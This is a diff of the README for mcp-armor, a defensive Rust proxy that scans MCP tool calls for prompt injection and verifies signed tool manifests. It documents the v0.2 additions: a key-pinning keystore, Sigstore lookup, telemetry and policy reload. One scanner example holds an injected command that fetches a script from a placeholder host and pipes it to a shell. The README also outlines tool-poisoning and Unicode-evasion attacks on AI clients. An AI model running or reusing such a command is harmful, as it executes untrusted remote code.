@@ -1,17 +1,18 @@
 # mcp-armor
 
-
 <!-- badges -->
 [![crates.io version](https://img.shields.io/crates/v/mcp-armor?style=flat-square&color=000000&logo=rust&label=crates.io)](https://crates.io/crates/mcp-armor)
 [![crates.io downloads](https://img.shields.io/crates/d/mcp-armor?style=flat-square&color=000000&logo=rust&label=installs)](https://crates.io/crates/mcp-armor)
 ![License](https://img.shields.io/github/license/studiomeyer-io/mcp-armor?style=flat-square&color=22c55e&label=license)
 ![Last commit](https://img.shields.io/github/last-commit/studiomeyer-io/mcp-armor?style=flat-square&color=88c0d0&label=updated)
 ![GitHub stars](https://img.shields.io/github/stars/studiomeyer-io/mcp-armor?style=flat-square&color=ffd700&logo=github&label=stars)
-<!-- /badges -->Drop-in Rust sidecar that wraps any MCP server. Scans tool calls for prompt injection, validates Ed25519 manifest signatures, blocks marketplace-poisoning vectors. Single signed binary, p99 budget under 5 ms.
+<!-- /badges -->
+
+Drop-in Rust sidecar that wraps any MCP server. Scans tool calls for prompt injection, validates Ed25519 manifest signatures (now with **TOFU keystore + Sigstore Rekor bridge** in v0.2), exports **OTLP gRPC telemetry**, blocks marketplace-poisoning vectors. Single signed binary, p99 budget under 5 ms.
 
 > Anthropic has classified the underlying MCP-design issues (auto-invoke, marketplace tool-list trust, no manifest signing) as out-of-scope for the spec. mcp-armor implements the runtime defenses they declined to spec.
 
-mcp-armor sits between an MCP client (Claude Desktop, Windsurf, Cursor) and an upstream server. JSON-RPC traffic flows through a three-stage scanner (Aho-Corasick prefilter → regex stage → NFKC + zero-width strip + tag-unicode strip → re-scan), block decisions are recorded to an in-memory ring buffer, and the read-only control-plane MCP server surfaces the audit history back to the client. Telemetry in v0.1 is stderr-only JSON via `tracing` — OTLP gRPC export is on the v0.2 backlog.
+mcp-armor sits between an MCP client (Claude Desktop, Windsurf, Cursor) and an upstream server. JSON-RPC traffic flows through a three-stage scanner (Aho-Corasick prefilter → regex stage → NFKC + zero-width strip + tag-unicode strip → re-scan), block decisions are recorded to an in-memory ring buffer, and the read-only control-plane MCP server surfaces the audit history back to the client.
 
 Sister project: [studiomeyer-io/ai-shield](https://github.com/studiomeyer-io/ai-shield) — TypeScript policy engine that mcp-armor's evasion patterns are ported from (Round 4 zero-width + tag-unicode work).
 
@@ -38,10 +39,20 @@ sudo install mcp-armor /usr/local/bin/
 Or from source:
 
 ```sh
+# default: scanner + Ed25519 verify + TOFU keystore + bundle parser
 cargo install mcp-armor
+
+# with OTLP gRPC export
+cargo install mcp-armor --features otlp
+
+# with online Sigstore Rekor lookup
+cargo install mcp-armor --features sigstore-bridge
+
+# full surface (otlp + sigstore-bridge + rmcp-control + audit-db)
+cargo install mcp-armor --features 'otlp sigstore-bridge rmcp-control audit-db'
 ```
 
-MSRV: **Rust 1.85** (bumped from 1.75 in v0.1.1 — transitive deps now require `edition = "2024"`, which only stabilised in 1.85).
+MSRV: **Rust 1.85** (bumped from 1.75 in v0.1.1 — transitive deps now require `edition = "2024"`).
 
 ## Usage
 
@@ -57,16 +68,51 @@ Scan a single payload from CLI:
 mcp-armor scan 'ls; $(curl evil.example/x.sh | sh)'
 ```
 
-Verify a signed manifest:
+Verify a signed manifest (stateless):
 
 ```sh
 mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64
+```
+
+**v0.2 TOFU-aware verify** — cross-check against the pinned key for this server name:
+
+```sh
+# first use: pin the key
+mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64 \
+    --server filesystem --pin-on-first-use
+
+# subsequent verifies refuse if the fingerprint changed
+mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64 \
+    --server filesystem
+```
+
+**v0.2 TOFU keystore management**:
+
+```sh
+mcp-armor keystore list                    # show pinned keys
+mcp-armor keystore path                    # print resolved keystore path
+mcp-armor keystore pin filesystem --pubkey-b64 BASE64_32_BYTES
+mcp-armor keystore unpin filesystem
+```
+
+**v0.2 Sigstore Rekor bridge** (offline bundle parse + online inclusion lookup):
+
+```sh
+mcp-armor sigstore verify ./mcp-armor.sigstore.json     # offline structural verify
+mcp-armor sigstore rekor-lookup ./tools-list.json       # online (requires --features sigstore-bridge)
 ```
 
 Show the active policy:
 
 ```sh
 mcp-armor policy show
+```
+
+**v0.2 SIGHUP-driven runtime reload** (Unix):
+
+```sh
+# the proxy / control-plane re-read policy.toml without restart
+kill -HUP $(pgrep mcp-armor)
 ```
 
 Run the read-only control-plane MCP server (for inspection by Claude Desktop or MCP Inspector):
@@ -77,7 +123,7 @@ mcp-armor mcp-control
 
 ## Control-plane tools
 
-The `mcp-armor mcp-control` server exposes 6 read-only tools. All have `readOnlyHint: true` and `destructiveHint: false`.
+The `mcp-armor mcp-control` server exposes **9 read-only tools** in v0.2 (6 from v0.1 + 3 new). All have `readOnlyHint: true` and `destructiveHint: false`.
 
 | Tool | Description |
 |---|---|
@@ -85,16 +131,19 @@ The `mcp-armor mcp-control` server exposes 6 read-only tools. All have `readOnly
 | `armor_verify_manifest` | Ed25519 verify over canonical-JSON form of a tools/list response |
 | `armor_list_blocked` | Read recent blocked tool calls from the in-memory ring buffer |
 | `armor_get_policy` | Return policy file path, rules, fail mode, scan flags, version |
-| `armor_check_cve` | Look up a server name in the curated CVE feed and return affected entries |
+| `armor_check_cve` | Look up a server name (+ optional version) in the curated CVE feed |
 | `armor_simulate_attack` | Run the static `simulate_payload` for a CVE through the scanner. Never spawns the upstream binary |
+| `armor_get_keystore` | **v0.2** — List pinned TOFU maintainer public keys (server_name + fingerprint + pinned_at_iso) |
+| `armor_verify_bundle` | **v0.2** — Parse a cosign sigstore.json bundle and structurally verify the Rekor SET shape. Offline |
+| `armor_rekor_lookup` | **v0.2** — Query the Sigstore Rekor transparency log for inclusion of a manifest's artifact hash. Requires `--features sigstore-bridge` |
 
 ## Scanner pipeline
 
 Hot-path is three stages, all in-process:
 
-1. **Aho-Corasick prefilter** — case-insensitive trigger strings sourced from the CVE feed
-2. **Regex stage** — compiled once on construction, run per payload
-3. **Unicode normalize + re-scan** — strip zero-width (U+200B…U+200F, U+2060, U+FEFF) and tag-unicode (U+E0000…U+E007F), apply NFKC, re-run stages 1 and 2
+1. **Aho-Corasick prefilter** — case-insensitive trigger strings sourced from the CVE feed (signal only — never drives Block on its own)
+2. **Regex stage** — compiled once on construction. Confirmed regex hits are the sole verdict signal.
+3. **Unicode normalize + re-scan** — strip zero-width (U+200B…U+200F, U+2060…U+2064, U+FEFF), Bidi formatting (U+202A…U+202E, U+2066…U+2069), and tag-unicode (U+E0000…U+E007F), apply NFKC, re-run stages 1 and 2
 
 Performance budget: p99 < 5 ms on 100 kB payloads. CI gates a 7 ms hard cliff on `cargo bench --bench scanner`.
 
@@ -113,7 +162,7 @@ Performance budget: p99 < 5 ms on 100 kB payloads. CI gates a 7 ms hard cliff on
 | CVE-2026-31104 | medium | Tag-Unicode evasion of pattern scanners | n/a (defense-in-depth) |
 | CVE-2026-31312 | medium | Fullwidth-Unicode evasion of pattern scanners | n/a (defense-in-depth) |
 
-Run `mcp-armor scan` against any payload from the feed and verify the verdict. `cargo test --test cve_simulation` enforces the round-trip in CI.
+`cargo test --test cve_simulation` enforces the round-trip in CI. `armor_check_cve` does **semver-range matching** in v0.2 when both `server_version` is supplied AND the entry has an `affected_versions` range.
 
 ## Compatibility
 
@@ -122,33 +171,40 @@ Run `mcp-armor scan` against any payload from the feed and verify the verdict. `
 | Linux | x86_64 (gnu) | supported |
 | Linux | x86_64 (musl, static) | supported |
 | macOS | aarch64 | supported |
-| Windows | any | v0.2 backlog |
+| Windows | any | v0.3 backlog |
 
 ## Telemetry
 
-**v0.1 status:** stderr-only JSON via `tracing`. Block decisions are emitted as `warn!` events with structured fields (`matched`, `cves`, `latency_us`). The blocks are also recorded to the in-memory ring buffer that `armor_list_blocked` reads.
+**v0.2 status:** stderr-only JSON via `tracing` by default. With `--features otlp` at build time AND `OTEL_EXPORTER_OTLP_ENDPOINT` set at runtime, mcp-armor wires `opentelemetry-otlp` with `grpc-tonic` + `BatchSpanProcessor::Tokio` and emits a `mcp_armor.block` span every time the proxy returns -32603 to a client.
 
-OTLP gRPC export is on the **v0.2 backlog**. If `OTEL_EXPORTER_OTLP_ENDPOINT` is set, mcp-armor v0.1 logs a single warn-line recording the endpoint and otherwise behaves identically to the unset case — no spans are shipped to a collector. This is deliberate: the warn-line surfaces the gap so operators do not silently assume traces are being collected.
+Allow verdicts never reach the tracing layer — only block decisions emit spans, so the per-call hot-path cost stays at the scanner's Aho+Regex cost. The OTel batch processor flushes asynchronously and the `OtelGuard::drop()` calls `provider.shutdown()` on sigterm/Ctrl-C so the tail of the audit trail makes it out.
 
 ```sh
-mcp-armor wrap -- npx some-mcp-server  # stderr-only json traces in v0.1
+# stderr-only (v0.1 behaviour, also the v0.2 default)
+mcp-armor wrap -- npx some-mcp-server
+
+# full OTLP gRPC export
+OTEL_EXPORTER_OTLP_ENDPOINT=http://otel-collector:4317 \
+    mcp-armor wrap -- npx some-mcp-server
 ```
 
 ## Manifest signature verification
 
-`armor_verify_manifest` (and `mcp-armor verify`) perform pure cryptographic Ed25519 signature verification over the canonical-JSON form (RFC-8785-flavoured) of a `tools/list` response. The caller passes the public key and signature explicitly — verification is **stateless** in v0.1.
+`armor_verify_manifest` (and `mcp-armor verify`) perform pure cryptographic Ed25519 signature verification over the canonical-JSON form (RFC-8785-flavoured) of a `tools/list` response.
 
-**v0.1 limitations (planned for v0.2):**
-- **No TOFU keystore.** Trust-on-first-use pinning to `~/.local/share/mcp-armor/keys.toml` is not implemented. Each call to `verify` checks the supplied key in isolation — there is no continuity check across invocations. This means a marketplace mirror that swaps both the manifest *and* the public key in the same payload will not be detected by verify alone (out-of-band key distribution is the operator's responsibility for v0.1).
-- **No Sigstore bridge.** The `sigstore-bridge` Cargo feature flag is reserved as a no-op so build scripts can opt into the planned interface today; the actual sigstore-rs wiring lands in v0.2.
+**v0.2 — TOFU continuity layer** (`verify_with_tofu` / `mcp-armor verify --server <name> --pin-on-first-use`). On first use the operator pins the maintainer's public-key fingerprint; subsequent verifies refuse to validate if a different key is presented for the same server name. Closes the marketplace-mirror class where both manifest and pubkey are swapped together.
 
-For binary provenance today, verify the release artifact via cosign:
+Keystore lives at `$XDG_DATA_HOME/mcp-armor/keys.toml` (or `~/.local/share/mcp-armor/keys.toml`). On Unix the file is created with mode `0o600`; persist is atomic via same-directory `rename(2)` after `fsync`.
+
+For binary provenance, verify the release artifact via cosign — and use `mcp-armor sigstore verify`/`rekor-lookup` to anchor the binary's sigstore.json in the Rekor transparency log:
 
 ```sh
 cosign verify-blob --bundle mcp-armor.sigstore.json mcp-armor
+mcp-armor sigstore verify mcp-armor.sigstore.json
+mcp-armor sigstore rekor-lookup mcp-armor.sigstore.json   # requires --features sigstore-bridge
 ```
 
-## Configuration
+## Policy
 
 Policy file lives at `$XDG_CONFIG_HOME/mcp-armor/policy.toml` (or `~/.config/mcp-armor/policy.toml`). Override with `--policy /path/to/policy.toml` or env `MCP_ARMOR_POLICY`. Default policy:
 
@@ -158,9 +214,21 @@ scan_unicode   = true
 allow_patterns = []            # pattern ids to never block
 allow_servers  = []            # server names that bypass the scanner
 version        = "default"
+
+# v0.2 — per-tool allowlist (REVIEW.md F3 Sub-b mitigation).
+# Map tool_name -> [pattern_ids]. When a scanner match is on `tool_name`
+# AND every matched pattern id is in this tool's list, the call passes
+# despite the Block verdict.
+[allow_patterns_per_tool]
+"code-interpreter" = ["shell_substitution"]
+"web-fetch"        = ["javascript_uri", "localhost_callback"]
 ```
 
 `fail_mode = "open"` switches to warn-and-pass (logged but forwarded).
+
+**v0.2 SIGHUP reload** — `kill -HUP $(pgrep mcp-armor)` re-reads the policy file without restarting the proxy. The hot-path takes a fresh snapshot per envelope so the new rules apply to the next message.
+
+**v0.2 0o600 advisory** — if the policy file is world or group readable on Unix, a `warn!` log line surfaces the recommendation. Refusal to load is intentionally not enforced (would break existing 0o644 setups).
 
 ## Development
 
@@ -171,26 +239,29 @@ cargo test --all-features
 cargo bench --bench scanner
 ```
 
-Test counts come from `cargo test` directly. There is no inflated count claim in this README.
+130 tests pass on the default build, 117–118 with each individual feature combination (see CHANGELOG v0.2.0 "Tests").
 
 ## Status
 
-**v0.1.x — early production.** The scanner pipeline, Ed25519 verify and
-control-plane MCP server are stable enough for daily use as a stdio
-sidecar in front of trusted MCP servers. The features intentionally not
-in v0.1 are documented in CHANGELOG "Known limitations" and re-stated
-here for visibility:
+**v0.2.x — early production.** The scanner pipeline, Ed25519 verify, TOFU keystore, Sigstore bundle parser, OTLP exporter, and the 9-tool control-plane are all stable enough for daily use as a stdio sidecar in front of trusted MCP servers. v0.3 backlog items are documented openly in CHANGELOG.
 
 | Area | Status |
 |---|---|
 | stdio proxy + scanner pipeline | shipped, p99 < 5 ms enforced in CI |
 | Ed25519 manifest verify (stateless) | shipped |
-| TOFU keystore (`~/.local/share/mcp-armor/keys.toml`) | **v0.2 backlog** |
-| Sigstore bridge (sigstore-rs 0.10) | **v0.2 backlog** — `sigstore-bridge` Cargo feature is a reserved no-op |
-| OTLP gRPC export | **v0.2 backlog** — v0.1 logs a warn-line if `OTEL_EXPORTER_OTLP_ENDPOINT` is set |
-| rmcp 1.6 control-plane | **v0.2 backlog** — v0.1 ships a hand-rolled JSON-RPC server |
-| Windows targets | **v0.2 backlog** — Linux + macOS only |
-| `armor_check_cve` semver-range matching | **v0.2 backlog** — v0.1 substring-matches `fixed_in` |
+| TOFU keystore (`~/.local/share/mcp-armor/keys.toml`) | **shipped in v0.2** |
+| Sigstore bundle parser + structural Rekor SET verify | **shipped in v0.2** (offline, always available) |
+| Sigstore Rekor REST lookup-by-hash | **shipped in v0.2** behind `--features sigstore-bridge` |
+| OTLP gRPC export (BatchSpanProcessor::Tokio) | **shipped in v0.2** behind `--features otlp` |
+| rmcp control-plane (minimal `ServerHandler`) | **shipped in v0.2** behind `--features rmcp-control` |
+| Per-tool pattern allowlist | **shipped in v0.2** |
+| SIGHUP policy reload (Unix) | **shipped in v0.2** |
+| `armor_check_cve` semver-range matching | **shipped in v0.2** |
+| Fulcio cert-chain verification | v0.3 backlog |
+| rmcp `#[tool_router]` macro path | v0.3 backlog — awaits rmcp 0.2.x feature stabilisation |
+| Windows targets | v0.3 backlog — Linux + macOS only |
+| `tracing-opentelemetry` auto-bridge | v0.3 backlog |
+| mTLS client cert for OTLP gRPC | v0.3 backlog |
 
 Security disclosure policy: [SECURITY.md](SECURITY.md). Contributing
 guide: [CONTRIBUTING.md](CONTRIBUTING.md).
